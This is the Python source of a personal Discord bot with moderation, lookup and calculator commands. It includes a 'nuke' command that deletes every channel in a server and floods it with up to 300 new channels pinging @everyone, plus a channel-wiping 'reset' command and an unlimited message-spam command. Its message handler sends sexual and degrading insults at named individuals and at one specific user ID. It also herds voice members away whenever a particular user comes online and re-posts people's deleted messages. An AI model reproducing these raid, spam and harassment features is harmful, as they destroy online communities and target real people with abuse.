import discord
import os
from keep_alive import keep_alive
from discord.ext import commands
import datetime
from instaloader import Instaloader, Profile
from discord import Embed
from discord import Spotify
import wikipedia
import sys


#-----Intents-----

intents = discord.Intents.all()
intents.presences = True
intents.members = True
intents.messages = True

client = commands.Bot(command_prefix='=',
                      help_command=None,
                      case_insensitive=True,
                      intents=intents,
                      allowed_mentions=discord.AllowedMentions(everyone=True))
client.remove_command('help')

#-----Events triggered n shi-----

@client.command()
async def restart(ctx):
  await ctx.send("Restarting...")
  os.system('python main.py')
  sys.exit()
  


@client.command()
async def test(ctx):
  await ctx.send("this is a test")

  
@client.command()
async def wiki(ctx, name):
  name = "'" + name + "'"
  result = wikipedia.summary(name)
  await ctx.send(result)

@client.event
async def on_ready():
    await client.change_presence(activity=discord.Game(
        name="with these bitches hearts"))

def has_numbers(inputString):
  return any(char.isdigit() for char in inputString)
  

@client.event
async def on_message_delete(message):
    global toggle
    if toggle % 2 == 0:
        if message.author == client.user:
            return
        elif "YAG" in str(message.author):
            return
        embed = discord.Embed(
            title="Deleted message!",
            description="**{0}** said **'{1}'** but it was deleted!".format(
                message.author.mention, message.content),
            color=0x19B9B9)
        await message.channel.send(embed=embed)


@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        text = "Sorry {}, you do not have permissions to do that lol".format(
            ctx.message.author.mention)
        await ctx.channel.send(text)
    if isinstance(error, commands.CommandNotFound):
        await ctx.channel.send("not even a real command bruh")


@client.event
async def on_member_update(before, after):
    channel = client.get_channel(887369792590327871)
    if before.status is discord.Status.offline and after.status is discord.Status.online:
        if after.id == 811075449308184648:
            await move()
            await channel.send(
                'AYO! Cerenity is now Online. Please follow evacuation protocols. Thanks and have a great day!',
                delete_after=10.0)


#-----client commands-----

toggle = 1

@client.command()
@commands.has_permissions(ban_members=True)
async def delete(ctx):
    global toggle
    toggle = toggle + 1
    if toggle % 2 == 0:
        await ctx.channel.send("deleting on")  #  Sends message to channel
        return
    elif toggle % 2 != 0:
        await ctx.channel.send("deleting off")  #  Sends message to channel


@client.command()
async def president(ctx):
    embed = discord.Embed(
        title="This is your president:",
        description=
        "Sup dawgs it's me, ya boy, president Not BN. In my offtime I like long walks on the beach during sunset. Otherwise i'm fuckin bitches in my 3 story condo. bih yah peace out",
        color=0x19B9B9)
    embed.set_author(
        name="President Not BN",
        url="https://twitter.com/LachDark",
        icon_url=
        "https://pbs.twimg.com/profile_images/1397996923508781058/CNBym2zc_400x400.jpg"
    )
    embed.set_footer(text="Note: Not BN is in no way affiliated with BN")
    embed.set_thumbnail(url="https://i.imgur.com/C4QKvfT.png")
    await ctx.channel.send(embed=embed)


@client.command()  
async def spin(ctx):
    await ctx.channel.send(
        "  https://tenor.com/view/monke-spin-spinning-monkey-spinning-monke-gif-20299211"
    )


@client.command()
async def spam00000(ctx, amount: int, *, message):
    for i in range(amount):
        await ctx.send(message)


@client.command()
async def help(ctx):
    embed = discord.Embed(
        title="AHHHH HELP!",
        description=
        "Commands include: \nkick: Kick a member \nban: Ban a member \nunban: Unban a member \nmute: Mute a member \ntimeout: puts user in timeout \nfree: releases user from timeout \ninfo: Print out info on the current server \ncurrent: Show info on current song \nspin: spinning monke \ndelete: enable deleted message logging \nnuke: creates channels and spams gifs and @everyone \nig: Lookup up instagram profiles",
        color=0x19B9B9)
    await ctx.channel.send(embed=embed)


@client.command()
@commands.has_permissions(kick_members=True)
async def kick(ctx, user: discord.Member, *, reason="No reason"):
    await user.kick(reason=reason)
    embed = discord.Embed(
        title="Kicked!",
        description="**{0}** was kicked for **'{1}'**".format(user, reason),
        color=0x19B9B9)
    await ctx.channel.send(embed=embed)


@client.command()
@commands.has_permissions(ban_members=True)
async def ban(ctx, user: discord.Member = None, *, reason="No reason"):
  if user == None:
    await ctx.reply("bruh ban who")
  else:
    await user.ban(reason=reason)
    embed = discord.Embed(
        title="Banned!",
        description="**{0}** was banned for **'{1}'** lol fuckin loser".format(
            user, reason),
        color=0x19B9B9)
    await ctx.channel.send(embed=embed)

@client.command()
@commands.has_permissions(ban_members=True)
async def banid(ctx, id: int, *, reason="No reason"):
  user = await client.fetch_user(id)
  if user == None:
    await ctx.reply("bruh ban who")
  else:
    await ctx.guild.ban(user,reason=reason)
    embed = discord.Embed(
        title="Banned!",
        description="**{0}** was banned for **'{1}'** lol fuckin loser".format(
            user, reason),
        color=0x19B9B9)
    await ctx.channel.send(embed=embed)


@client.command()
@commands.has_permissions(ban_members=True)
async def unban(ctx, id: int):
    user = await client.fetch_user(id)
    await ctx.guild.unban(user)
    await ctx.channel.send("{0} has been unbanned".format(user.mention))


@client.command()
@commands.has_permissions(ban_members=True)
async def mute(ctx, member: discord.Member):
    role = discord.utils.get(ctx.guild.roles, name='Muted')
    await member.add_roles(role)
    await ctx.send("free my mans he aint do none")


@client.command()
@commands.has_permissions(ban_members=True)
async def timeout(ctx, member: discord.Member):
    role = discord.utils.get(ctx.guild.roles, name='Timeout')
    await member.add_roles(role)
    await ctx.send("Fuck you, bitch")


@client.command()
@commands.has_permissions(ban_members=True)
async def unmute(ctx, member: discord.Member):
    role = discord.utils.get(ctx.guild.roles, name='Muted')
    await member.remove_roles(role)
    await ctx.send("FREED")


@client.command()
@commands.has_permissions(ban_members=True)
async def free(ctx, member: discord.Member):
    role = discord.utils.get(ctx.guild.roles, name='Timeout')
    await member.remove_roles(role)
    await ctx.send("FREED")


@client.command()
async def info(ctx):
    embed = discord.Embed(title=f"{ctx.guild.name}",
                          description="Server data:",
                          timestamp=datetime.datetime.utcnow(),
                          color=0x19B9B9)
    embed.add_field(name="Server created at:", value=f"{ctx.guild.created_at}")
    embed.add_field(name="Server Owner:", value=f"{ctx.guild.owner}")
    embed.add_field(name="Server Region:",
                    value=f"{ctx.guild.region}".capitalize())
    embed.add_field(name="Server ID:", value=f"{ctx.guild.id}")
    embed.set_thumbnail(url=f"{ctx.guild.icon_url}")

    await ctx.send(embed=embed)


@client.command(aliases=["ig"])
async def instagram(ctx, instaUsername):
    from os import environ
    environ['TF_CPP_MIN_LOG_LEVEL'] = '3'
    bot = Instaloader()
    profile = Profile.from_username(bot.context, str(instaUsername))
    embed = Embed(title=f"Instagram", color=0x11019e)
    embed.add_field(name="Username",
                    value=f"`@{profile.username}`",
                    inline=True)
    embed.add_field(name="Followers",
                    value=f"{profile.followers}",
                    inline=True)
    embed.add_field(name="Follows", value=f"{profile.followees}", inline=True)
    embed.add_field(name="Bio", value=f"{profile.biography}", inline=True)
    await ctx.send(embed=embed)


#purging
@client.command(pass_context=True)
@commands.has_permissions(administrator=True)
async def clear(ctx, amount: int):
    await ctx.channel.purge(limit=amount)
    await ctx.send(f'Cleared {amount} messages', delete_after=5.0)


@client.command(pass_context=True)
async def nuke(ctx, channelnukename="bruh"):
  if ctx.guild.id == 603084195102851073:
    await ctx.channel.send("fucked up")
  else:
    if ctx.author.id == 414931767129276428:
        await ctx.message.delete()
        guild = ctx.guild
        count = 0
        message = "https://cdn.discordapp.com/attachments/868557949721796608/945831875308576828/video0_13_online-video-cutter.com.gif"
        for channel in guild.channels:
            await channel.delete()
        while count < 300:
            await guild.create_text_channel(channelnukename)
            channel = guild.channels[count]
            await channel.send(message)
            await channel.send("@everyone")
            count += 1
    else:
        await ctx.send("Bruh")


@client.command(pass_context=True)
async def reset(ctx, channelnukename="bruh"):
  if ctx.guild.id == 603084195102851073:
    await ctx.channel.send("fucked up")
  else:
    if ctx.author.id == 414931767129276428:
        await ctx.message.delete()
        guild = ctx.guild
        for channel in guild.channels:
            await channel.delete()
    else:
        await ctx.send("Bruh")


async def move():
    channel = client.get_channel(604520849621516301)
    evac = client.get_channel(860338189231194132)
    Members = channel.members
    for members in Members:
        await members.move_to(evac)
    channel = client.get_channel(755483435656675539)
    Members = channel.members
    for members in Members:
        await members.move_to(evac)


async def move2():
    channel = client.get_channel(860338189231194132)
    evac = client.get_channel(604520849621516301)
    Members = channel.members
    for members in Members:
        await members.move_to(evac)


@client.command(aliases=["listening"])
async def current(ctx, user: discord.Member = None):
    if user == None:
        user = ctx.author
        pass
    if user.activities:
        for activity in user.activities:
            if isinstance(activity, Spotify):
                embed = discord.Embed(description="Listening on spotify",
                                      color=0x19B9B9)
                embed.set_author(name=user.name, icon_url=user.avatar_url)
                embed.add_field(name="Track",
                                value=f"{activity.title}",
                                inline=False)
                embed.add_field(name="Album",
                                value=f"{activity.album}",
                                inline=False)
                embed.add_field(name="Artist",
                                value=f"{activity.artist}",
                                inline=False)
                embed.set_thumbnail(url=activity.album_cover_url)
                await ctx.send(embed=embed)
    else:
        client.send("Bruh your activity empty")


@client.command(aliases=["c"])
async def calc(bruh):

  global n, m, x 
  n = bruh.content.lower()
  m = n
  if '+' in n:
      n = n.split('+')
      x = 0
      for i in range(len(n)):
          x = x + float(n[i])
      await bruh.channel.send(m + " = " + str(x))
  elif '-' in n:
      n = n.split('-')
      x = float(n[0])
      for i in range(len(n) - 1):
          x = x - float(n[i + 1])
      await bruh.channel.send(m + " = " + str(x))
  elif '*' in n:
      n = n.split('*')
      x = 1
      for i in range(len(n)):
          x = x * float(n[i])
      await bruh.channel.send(m + " = " + str(x))
  elif '!' in n:
      n = n.split('!')
      x = 1
      n = int(n[0])
      for i in range(n):
          x = x * (n - i)
      await bruh.channel.send(m + " = " + str(x))
  elif '/' in n:
      n = n.split('/')
      x = int(n[0]) / int(n[1])
      await bruh.channel.send(m + " = " + str(x))
  elif '^' in n:
    n = n.split('^')
    x = int(n[0])**int(n[1])
    await bruh.channel.send(m + " = " + str(x))



@client.event
async def on_message(message):                              
      if client.user.mentioned_in(message) and client.user != message.author:
        await message.reply("lol dat me")
      if client.user != message.author and '<' not in message.content:
        if has_numbers(message.content) == True: 
         await calc(message)

        if message.content.lower() == 'yasa':
            await message.channel.send('lol hate that guy')
        if message.author.id == 888925448954871868:
            await message.channel.send(
                "<@888925448954871868> suckin milk outta your moms titties like fine wine"
            )
        if message.content.lower() == 'utsho':
            await message.channel.send(
                'What a sexy beast <:bite:806383682629664840> ')
        if message.content.lower() == 'boobie':
            await message.channel.send('mmm, yummy.')
        if message.content.lower() == 'kuzy':
            await message.channel.send(
                'your name is joe, ur opinion is irrelevant')
        if message.content.lower() == 'shoo':
            await message.channel.send('shoutout all the pears')
        if message.content.lower() == 'nafiz':
            await message.channel.send('fucking bitch ass hoe')
        if message.content.lower() == 'roudro':
            await message.channel.send('failed abortion')
        if message.content.lower() == 'cd':
            if 'cdn' in message.content:
                return
            else:
                await message.reply('see deez nuts lmao')
        if message.content.lower() == 'parodies':
            await message.reply('pair of deez nuts in ur mouth lmao')
        if message.content.lower() == 'tucker':
            await message.channel.send(
                'god he gives me such a raging boner lord have mercy')
        if message.content.lower() == 'disability':
            await message.reply('dis ability to fuck yo bitch')
        if message.content.lower() == 'fitness':
            await message.reply('fit this dick in yo mouth')
        if message.content.lower() == 'im gay':
            await message.reply('then prove it and come smack my ass ;)')
        if message.content.lower() == 'varun':
            await message.reply('lol come suck my dick bbg ;) -Utsho')
        if message.content.lower() == 'candice':
            await message.reply('candice dick fit in yo mouth, bitch')
        if message.content.lower() == 'parody':
            await message.reply('pair of deez nuts in yo mouth lmao')
        if message.content.lower() == 'kenya':
            await message.reply('kenya fit deez nuts in yo mouth')
        if message.content.lower() == 'russian':
            await message.reply("russian to suck dn")
        if message.content.lower() == 'Russian':
            await message.reply("russian to suck dn")
        if message.content.lower() == 'dn':
            await message.reply("deez nuts")
        if message.content.lower() == 'pull':
            await message.reply("why don't you pull some bitches")
        if message.content.lower() == 'james':
            await message.reply("fat fucking white bitch whore ass fuck tard cum gobbler no hoes fat fuck musty as hell")

        if message.content.lower() == 'balls':
            await message.reply(
                "https://tenor.com/view/balls-love-struck-lick-tongue-gif-14644911"
            )
        if 'ass' in message.content:
                await message.reply(
                    'https://cdn.discordapp.com/emojis/627664851531071518.gif?v=1'
                )
        if message.content.lower() == 'kiss me':
            await message.reply(
                'https://tenor.com/view/caught-in-4k-caught-in4k-chungus-gif-19840038'
            )
        

      await client.process_commands(message)

#-----shit u do in the end-----

keep_alive()
token = os.environ.get("DISCORD_BOT_SECRET")
client.run(token)